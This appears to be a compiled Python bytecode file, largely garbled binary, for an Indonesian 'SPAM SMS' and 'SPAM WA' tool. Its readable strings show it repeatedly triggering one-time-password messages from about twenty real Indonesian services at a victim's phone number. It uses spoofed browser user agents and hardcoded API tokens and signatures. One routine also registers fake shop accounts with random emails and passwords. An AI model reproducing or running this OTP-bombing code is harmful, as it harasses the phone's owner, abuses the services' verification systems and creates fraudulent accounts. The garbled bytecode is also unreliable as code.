o
    ??bzO  ?                	   @   s?  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlmZ	 d dl
mZ d dlmZ dZdZdZdZd	Zd
ZdZdZdZdZdZd	Zd
ZdZdej?? v r[e?d? ndej?? v rhe?d? ndej?? v rue?d? ne?d? ze?d?j Z!W n ej"j#y?   e$de? de? d?? Y nw e?%g d??Z&dd? Z'dd? Z(G dd? d?Z)e?  ed? G dd? d?Z*G dd? d?Z+e,d kr?ze)?  W dS  e-y?   e$d!e? de? d"?? Y dS  ej"j#y?   e$d!e? de? d#?? Y dS w dS )$?    N)?print)?Panel)?sleepz[1;31mz[1;32mz[1;33mz[1;36mz[1;35mz[1;37mz[1;30mZlinux?clear?win?clszhttps://api.ipify.orgz
  ?! zKoneksi Internet Error
)z?Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36z?Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36z?Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36zUDalvik/1.6.0 (Linux; U; Android 4.1.1; BroadSign Xpress 1.0.14 B- (720) Build/JRO03H)z?Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30z?Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36a  Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36c                  C   s6   t d? d} tt| ddd?? d}tt|dd?? d S )Nu?  

┌─────────────────────────────────────────────────────────────┐
│    █████  ███████ ███████ ██████      ███    ███ ██    ██   │
│   ██   ██ ██      ██      ██   ██     ████  ████  ██  ██    │
│   ███████ ███████ █████   ██████      ██ ████ ██   ████     │
│   ██   ██      ██ ██      ██          ██  ██  ██    ██      │
│   ██   ██ ███████ ███████ ██          ██      ██    ██      │
└─────────────────────────────────────────────────────────────┘u|   [white][[yellow]•[white]] Status	[red]:[green] Online
[white][[yellow]•[white]] IP		[red]:[green] 111.121.34.567[white] ?cyanz[blue]Informasi[white])?style?titlezr[white][[cyan]01[white]]. SPAM SMS
[[cyan]02[white]]. CHAT AUTHOR
[[cyan]03[white]]. Keluar ([yellow] out[white] )?r
   )r   ?cetak?nel)?bannerZbanner2? r   ?temp.py?logoB   s
   r   c                 C   s2   | d D ]}t j?|? t j??  t?d? qd S )N?
gy?&1?|?)?sys?stdout?write?flush?timer   )?u?er   r   r   ?jalanR   s   2r   c                   @   s$   e Zd Zdd? Zdd? Zdd? ZdS )?Mainc                 C   s   d| _ | ??  d S )NzHendar Official)?sanz?main??selfr   r   r   ?__init__V   s   zMain.__init__c                 C   sZ   t |?D ]&}|d8 }tj?dt? dt? dt? t|?? dt? d?
? tj??  t	d? qd S )N?   ?  u   •> zPlease wait ? zsec )
?ranger   r   r   ?red?white?green?strr   r   )r    Zfree_tutorialr   r   r   r   ?waitZ   s   .

?z	Main.waitc                 C   s?  t ?  tdt? dt? dt? d??}|dks|dkr?d}tt|dd	?? td
t? dt? dt? dt? dt? d?? tdt? dt? dt? dt? dt? d???	dd?a
t?ttttg?}td? td? t
dkrfd S 	 t?  t?  t?ttttg?}t|? ? | ?d? tj?d? tj?d? td? qg|dks?|dkr?tdt? dt? d?? tdt? dt? d?? tt? dt? d?? t?d? t?  t?d? d S |d ks?|d!kr?d S |d"ks?|d#kr?td$t? d%t? d&?? d S td$t? d%t? d'?? d S )(Nz  ?[??z] Input Pilihan : ?1Z01u;   [white][[green]•[white]] Disarankan Untuk Spam Kang Riperr	   r   r#   u   •z	] Contoh z: z+6281234xxxxxxz	] Number ?+62? r"   T?   z                           ??2Z02r   ?   └───z FOLLOW FB GW NGABz8 OPEN MENGAJAR JALAN KAN TERMUX SAMPE BISA BAWA DANA 50KzKELIK ENTER zPxdg-open https://www.facebook.com/mustofa.ganteng123?text=Hallo%20Bang%20Gantengzpython spam.py?4Z04?3Z03?
     r   zExit This Tools..
zOption Does Not Exist
)r   ?input?x?hr   r   r   ?b?k?replace?nomor?random?choice?mr   r   r   ?sxp_sms?sxp_wa?ir*   r   r   r   r&   r'   ?os?system?exit)r    r   ZasuhZbiZasur   r   r   r   a   sB   (0

?	
z	Main.mainN)?__name__?
__module__?__qualname__r!   r*   r   r   r   r   r   r   U   s    r   r"   c                   @   s?   e Zd Zdd? Zdd? Zdd? Zdd? Zd	d
? Zdd? Zdd? Z	dd? Z
dd? Zdd? Zdd? Zdd? Zdd? Zdd? Zdd? Zdd ? Zd!S )"rA   c                 C   ?   t ?? | _| ??  d S ?N??requestsZSession?reqr   r   r   r   r   r!   ?   ?   
zsxp_sms.__init__c                 C   s.   | j jddddtdd?dd|? ?id	?j}d S )
Nz>https://service.mokapos.com/account/v1/verification/phone/send?!application/json, text/plain, */*Z	undefinedZon?application/json;charset=UTF-8)?acceptZauthorizationz	save-data?
user-agent?content-typeZphone_numberr.   ??headers?json?rN   ?post?agent?text?r    ?no?__req__r   r   r   ?	sms_otp_1?   s   ?
???zsxp_sms.sms_otp_1c                 C   sL   t ?d|? ?dddd??}| jjdddd	d
dddddtd?
d|id?j}d S )N?0Z1583590641573155574Z158359064157312Z11111)?mobileZnoiseZrequest_time?access_tokenzPhttps://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_codez7text/html, application/xhtml+xml, application/json, */*?#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7Z166?0application/x-www-form-urlencoded; charset=UTF-8zhttps://h5.rupiahcepatweb.comzkhttps://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723?empty?cors?	same-site)
rR   ?accept-language?content-lengthrT   ?origin?referer?sec-fetch-dest?sec-fetch-mode?sec-fetch-siterS   ?data?rV   ro   )rW   ?dumpsrN   rY   rZ   r[   )r    r]   ro   r^   r   r   r   ?	sms_otp_2?   s.   ?????zsxp_sms.sms_otp_2c                 C   s.   | j jddddtdd?dd|d	d
?d?j}d S )Nz+https://www.olx.co.id/api/auth/authenticate?*/*zVQMGU1ZVDxABU1lbBgMDUlI=z.83b09e49653c37fb4dc38423d82d74d7#1597271158063?application/json)rR   ?x-newrelic-idzx-panamera-fingerprintrS   rT   Zretry?sms?id)Z	grantType?method?phoneZlanguagerU   rX   r\   r   r   r   ?	sms_otp_3?   s   ????zsxp_sms.sms_otp_3c                 C   s2   | j jdtddddd?ddd|? ?iid	?j}d S )
Nz1https://www.alodokter.com/login-with-phone-numberrt   z)https://www.alodokter.com/login-alodokterzhttps://www.alodokter.com)rS   rT   rk   rR   rj   ?userry   r`   rU   rX   r\   r   r   r   ?	sms_otp_4?   s   ?
????zsxp_sms.sms_otp_4c                 C   s(   | j jddtdd?|ddd?d?j}d S )	Nz/https://www.kelaspintar.id/user/otpverification?XMLHttpRequestzhttps://www.kelaspintar.id/)?x-requested-with?
User-Agent?RefererZsend_otp_regz%2B62)Zuser_mobile?otp_typeZmobile_coderp   rX   r\   r   r   r   ?	sms_otp_5?   s   ????zsxp_sms.sms_otp_5c                 C   s?   t ?g d??}t ?g d??}t ?g d??}t ?g d??}| jjdd|d |ddd	|? ?d
||d?	idddtddddddd?
d?j}d S )N)z
HAI AnjingzHallo BangsadzHallo SayangzHallo Ripperz
Hallo Ngab)znsnsmsmksksmsm@gmail.comzlavon.lockman@gmail.comzduane_mclaughlin38@gmail.comzalfreda.lindgren@gmail.comzleonardo_kuhlman@gmail.comzlyric51@gmail.comzdevonte_littel@gmail.comznewell.kuhic@gmail.com)Z
mamsmms123ZWadepak1037Zwaifugw1011)z
13/09/1999z
04/02/2022?
05/02/2022r?   z
06/02/2022z
10/02/2022z.https://www.matahari.com/rest/V1/thorCustomersZthor_customerr.   r-   r`   r/   )	?nameZcard_numberZemail_addressZmobile_country_codeZ	gender_id?mobile_number?mro?password?
birth_datezwww.matahari.comzVg4GVFVXDxAGVVlVBgcGVlY=zhttps://www.matahari.comrt   rs   r}   z1https://www.matahari.com/customer/account/create/?gzip, deflate, brrc   )
?Hostru   rj   rS   rT   rR   r~   rk   ?accept-encodingrh   ?rW   rV   )r>   r?   rN   rY   rZ   r[   )r    r]   Z	aink_sanz?emailZpwr?   r^   r   r   r   ?	sms_otp_6?   sN   ?	???
?????zsxp_sms.sms_otp_6c                 C   s@   | j jddddddtddd	d
ddddd?dd|? ?id?j}d S )Nz:https://api.duniagames.co.id/api/user/api/v2/user/send-otpzapi.duniagames.co.idZ32rP   z$cc45ed83-73bd-4a98-83e3-874e8bc11a7frw   ZFRrt   zhttps://duniagames.co.idrg   rf   re   zhttps://duniagames.co.id/r?   )r?   ri   rR   zx-devicerh   rS   z	ciam-typerT   rj   rn   rm   rl   rk   r?   ZphoneNumberr.   rU   rX   r\   r   r   r   ?	sms_otp_7*  s*   ?
???zsxp_sms.sms_otp_7c                 C   s*   | j jdtdd?d|? ?dd?d?j}d S )Nz!https://harvestcakes.com/register)r   r?   r`   r/   )ry   ?urlrp   rX   r\   r   r   r   ?	sms_otp_8A  s   ???	?zsxp_sms.sms_otp_8c                 C   sB   | j jdddddtddddd	d
?
d|? ?dddddd?d?j}d S )NzUhttps://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=idzidentity-gateway.oyorooms.comzhttps://www.oyorooms.comrw   z8SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=rt   rs   zhttps://www.oyorooms.com/loginr?   )
r?   Zconsumer_hostrh   rb   r   ?Content-TyperR   rj   rk   ?Accept-Encodingr`   r.   ZIDr4   ?trueZConsumer_Guest)ry   Zcountry_codeZcountry_iso_codeZnodZsend_otpZdevise_rolerU   rX   r\   r   r   r   ?	sms_otp_9M  s,   ????zsxp_sms.sms_otp_9c              	   C   s0   | j jdd|? ?dd?ddddtd	?d
?j}d S )Nz<https://crp-app.stamps.co.id/api/auth/validate-mobile-numberr`   Z@sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O)r?   ?tokenzcrp-app.stamps.co.idzapplication/json; charset=utf-8Z106?gzip)r?   rT   ri   r?   r   r?   rX   r\   r   r   r   ?
sms_otp_10e  s   ????zsxp_sms.sms_otp_10c                 C   s0   | j jdddddtdddd	d
?	d| d?j}d S )Nz<https://app-api.kredito.id/client/v1/common/verify-code/sendZ1603281035821zid-IDZKreditoZandroidz?eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5OksZ e15dbea8602409df32a2ed5a123dc244?application/json; charset=UTF-8Z79)	zLPR-TIMESTAMP?Accept-Languagez	LPR-BRANDzLPR-PLATFORMr   ?AuthorizationzLPR-SIGNATUREr?   zContent-LengthzG{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}rp   rX   r\   r   r   r   ?
sms_otp_11t  s   ???zsxp_sms.sms_otp_11c                 C   sF   | j jdddddtdddd	d
ddddd?d|? ?dddd?d?j}d S )Nz,https://www.autofun.co.id:443/v2/captcha/smszwww.autofun.co.id?
keep-aliveZ84rs   rc   rQ   zhttps://www.autofun.co.idzacr.browser.bareboneszsame-originrf   re   z&https://www.autofun.co.id/mobil/datsun?gzip, deflate)r?   ?
ConnectionzContent-lengthrR   r   r?   rT   ?Origin?X-Requested-WithzSec-Fetch-SitezSec-Fetch-ModezSec-Fetch-Destr?   r?   ?62zid-idrw   ?   )ZphoneNumZlanguageCode?countryCode?platformrU   rX   r\   r   r   r   ?
sms_otp_12?  s0   ????zsxp_sms.sms_otp_12c                 C   s6   | j jddd| iddddtdd	d
ddd?
d?j}d S )Nz'https://api.myfave.com/api/fave/v3/authry   r.   zapi.myfave.comr?   zFave-PWA/v1.0.0zhttps://m.myfave.comrt   rs   z!https://m.myfave.com/jakarta/authr?   rc   )
r?   r?   zx-user-agentr?   r   rT   ?Acceptr?   r?   r?   r?   rX   r\   r   r   r   ?
sms_otp_13?  s"   ????zsxp_sms.sms_otp_13c                 C   ?f   t ?g d??}t ?dd?}| jjdddddtd	d
ddd	ddddd?|t|? d|? ?dd?d?j}d S )N?ZfahmiZxzc0derZbed3bahZxmanz?o   ??  ?(https://wong.kitabisa.com/register/draft?wong.kitabisa.com?pwa?https://account.kitabisa.com?
1611020248?1.0.0rt   ?kanvas?$107790c3-86e0-4872-9dfb-b9c5da9bfa13?@e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e?3.4.0?2https://account.kitabisa.com/register/otp?type=smsrc   ?r?   zx-ktbs-platform-namerj   zx-ktbs-timerS   zx-ktbs-api-versionrR   zx-ktbs-client-namezx-ktbs-request-idzx-ktbs-client-versionzx-ktbs-signature?versionrk   rh   r?   rv   ?Z	full_name?usernamer?   rU   ?r>   r?   ZrandintrN   rY   rZ   r)   r[   ?r    r]   ZnicknameZangkar^   r   r   r   ?
sms_otp_14?  ?<   ???
???zsxp_sms.sms_otp_14c                 C   s?   | ? t? | ?t? | ?t? | ?t? | ?t? | ?t? | ?t? | ?t? | ?	t? | ?
t? | ?t? | ?t? | ?t? | ?t? tdt? dt? dt? dt? dt? ?
? d S )Nr3   r+   ?   ✓z] zSPAM SMS BERHASIL.....!!)r_   r=   rr   rz   r|   r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r   r8   r:   r9   r   r   r   r   r   ?  s   













*zsxp_sms.mainN)rG   rH   rI   r!   r_   rr   rz   r|   r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r   r   r   r   r   rA   ?   s"    D%rA   c                   @   sL   e Zd Zdd? Zdd? Zdd? Zdd? Zd	d
? Zdd? Zdd? Z	dd? Z
dS )rB   c                 C   rJ   rK   rL   r   r   r   r   r!   ?  rO   zsxp_wa.__init__c                 C   r?   )Nr?   r?   r?   r?   r?   r?   r?   r?   r?   rt   r?   r?   r?   r?   r?   rc   r?   r`   Zwhatsappr?   rU   r?   r?   r   r   r   ?wa_otp_1?  r?   zsxp_wa.wa_otp_1c                 C   s   | j ?d|? d??j}d S )Nz&https://m.redbus.id/api/getOtp?number=z&cc=62&whatsAppOpted=true)rN   ?getr[   r\   r   r   r   ?wa_otp_2  s
   
??zsxp_wa.wa_otp_2c                 C   s6   | j jddddddddtd	?d
ddd|d?d?j}d S )Nz/https://api.bukuwarung.com/api/v1/auth/otp/sendrt   r?   Z3399r?   zapi.bukuwarung.comz
Keep-Aliver?   )r?   zX-APP-VERSION-NAMEzX-APP-VERSION-CODEr?   r?   r?   r?   r   Z	LOGIN_OTPr?   z$00000177-142d-f1a2-bac4-57a9039fdc4dZWA)?actionr?   ZdeviceIdrx   ry   rU   rX   r\   r   r   r   ?wa_otp_3  s&   ????zsxp_wa.wa_otp_3c                 C   s(   | j jddtid|? ?dd?d?j}d S )Nz+https://evermos.com/api/client/request-coderS   r?   r   )Z	telephone?typerp   rX   r\   r   r   r   ?wa_otp_4,  s   ????zsxp_wa.wa_otp_4c                 C   sH   | j jdddddddtdddd	d
dd?d|? ?dddddd?d?j}d S )Nz+https://wapi.ruparupa.com/auth/generate-otpzwapi.ruparupa.comr?   z?eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0Ert   Zodira   zhttps://m.ruparupa.comz4https://m.ruparupa.com/verification?page=otp-choicesr?   rc   )r?   r?   r?   r?   r?   zX-Company-Namer   zuser-platformzX-Frontend-Typer?   r?   r?   r?   r`   ?registerZchatr/   r   )ry   r?   Zchannelr?   Zcustomer_idZ	is_resendrU   rX   r\   r   r   r   ?wa_otp_57  s2   ????zsxp_wa.wa_otp_5c              	   C   sn   ddddt ddd?}| jjd| d	 |d
?j}t?d|??d?}d||dddddd?}| jjd||d?j}d S )Nr?   z.application/json, text/javascript, */*; q=0.01zhttps://accounts.tokopedia.comr}   rd   r?   )r?   r?   r?   r?   r   r?   r?   z>https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=z?&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D)rV   z<\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>r"   Z116r/   ?6)r?   ZmsisdnZtkr?   Zoriginal_paramZuser_idZ	signatureZnumber_otp_digitz4https://accounts.tokopedia.com/otp/c/ajax/request-warp   )rZ   rN   r?   r[   ?re?search?grouprY   )r    r]   rV   Zsiter?   ro   r^   r   r   r   ?wa_otp_6R  s0   ?	?
??zsxp_wa.wa_otp_6c                 C   sf   | ? t? | ?t? | ?t? | ?t? | ?t? | ?t? tdt? dt	? dt? dt
? dt? ?
? d S )Nr3   r+   r?   ?]z SPAM WA BERHASIL......!!)r?   r=   r?   r?   r?   r?   r?   r   r8   r:   r9   r   r   r   r   r   l  s   





*zsxp_wa.mainN)rG   rH   rI   r!   r?   r?   r?   r?   r?   r?   r   r   r   r   r   rB   ?  s    %rB   ?__main__r6   zCtrl + C Detected
zInternet Connection Error
).r?   r   rD   rW   rM   r>   r   Zrichr   r   Z
rich.panelr   r   r   r@   r9   r;   r:   r   r8   rC   r&   r(   Zyellowr	   Zpurpler'   Zblackr?   ?lowerrE   r?   r[   Zip?
exceptions?ConnectionErrorrF   r?   rZ   r   r   r   rA   rB   rG   ?KeyboardInterruptr   r   r   r   ?<module>   s?   @????????3  _ ??